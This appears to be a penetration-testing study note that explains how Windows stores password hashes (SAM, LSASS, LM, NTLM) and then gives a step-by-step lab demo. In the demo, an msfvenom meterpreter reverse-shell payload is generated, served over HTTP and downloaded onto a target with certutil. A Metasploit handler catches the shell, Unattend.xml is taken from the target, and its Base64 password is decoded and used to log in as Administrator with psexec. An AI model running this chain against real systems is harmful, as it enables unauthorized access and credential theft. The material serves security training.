# Windows Password Hashes
- The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA)
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
  - LM
  - NTLM
- Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.

## SAM Database
- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the OS is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.
- Administrative privileges are required in order to access and interact with the LSASS process.

## LM (LanMan)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
- The protocol is used to hash user passwords, and the hasing process can be broken down into the following steps:
  - The password is broken into two seven-character chunks
  - All characters are then converted into uppercase
  - Each chunk is then hashed separately with the DES algorithm.
- LM hashing is generally considered to be a weak protocol and can easily be cracked, primarly because the password hash does not include salts consequently making brute-force and rainbow table attacks effective against LM hashes.

![grafik](https://github.com/user-attachments/assets/a26dee98-a0ee-4713-b809-63b8813629c4)

## NTLM (NT HASH)
- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- Form Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
  - Does not split the hash in to two chunks
  - Case sensitive
  - Allows the use of symbols and unicode characters
![grafik](https://github.com/user-attachments/assets/448a152b-8e1c-4b6d-a87d-f2def4139e73)

# Windows Configuration Files

## Unattended Windows Setup
- The **Unattended Windows Setup** utility utilizes configuration files that contain user account and system configuration information. Key files include:
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`
- For security, passwords in these configuration files may be encoded in Base64.

## Demo: Searching For Passwords In Windows Configuration Files
In this demonstration, we gain access to the target via a meterpreter session, locate the `Unattend.xml` file to identify the password, decode it with Base64, and authenticate with the target using PSexec.

1. **Check User Privileges on the Target**
   - Run the following command to check user privileges:
     ```
     net user
     ```
   - This command shows the user accounts on the target. We use it to confirm if we are running as an unprivileged user.

2. **Generate a Malicious Payload**
   - Create a malicious payload using `msfvenom`:
     ```
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ownIP] LPORT=1234 -f exe > payload.exe
     ```
   - This command generates a reverse TCP payload for meterpreter.

3. **Set Up a Simple HTTP Server**
   - Start a simple HTTP server to host the payload:
     ```
     python -m SimpleHTTPServer 80
     ```
   - This command sets up a basic HTTP server to serve `payload.exe`. We can access the server from the target system to download the payload.

4. **Download and Execute the Payload on the Target**
   - On the target system, open the command prompt and navigate to the Desktop:
     ```
     cd Desktop
     ```
   - Download the payload using `certutil`:
     ```
     certutil -urlcache -f http://[kali system IP]/payload.exe payload.exe
     ```
   - This command downloads the `payload.exe` from the HTTP server to the target system.

5. **Set Up Metasploit to Handle the Payload**
   - On our Kali Linux machine, start PostgreSQL and Metasploit:
     ```
     service postgresql start && msfconsole
     ```
   - Configure Metasploit to handle incoming connections from the payload:
     ```
     use multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
     set LPORT 1234
     set LHOST [kali IP]
     run
     ```
   - These commands set up Metasploit to listen for the reverse shell connection.

6. **Establish a Meterpreter Session**
   - When the payload is executed on the target, a meterpreter session should be created.

7. **Search for the Unattend.xml File**
   - In the meterpreter session, gather system information:
     ```
     sysinfo
     ```
   - Search for the `Unattend.xml` file:
     ```
     search -f Unattend.xml
     ```
   - Alternatively, navigate manually to the directory:
     ```
     cd C:\
     cd Windows
     cd Panther
     dir
     ```
   - Download the `Unattend.xml` file to our local machine:
     ```
     download Unattend.xml
     ```

8. **Extract and Decode the Password**
   - View the contents of the `Unattend.xml` file:
     ```
     cat Unattend.xml
     ```
   - If the `PlainText` attribute is `false`, the password is encoded in Base64. Copy the encoded password.
   - Create a text file and paste the copied password:
     ```
     vim password.txt
     ```
   - Decode the Base64-encoded password:
     ```
     base64 -d password.txt
     ```

9. **Authenticate with the Target Using PSexec**
   - Use PSexec to authenticate with the target system as Administrator:
     ```
     psexec.py Administrator@[target IP]
     ```
   - Enter the decrypted password when prompted.

   - We should now gain a command shell session on the target system.






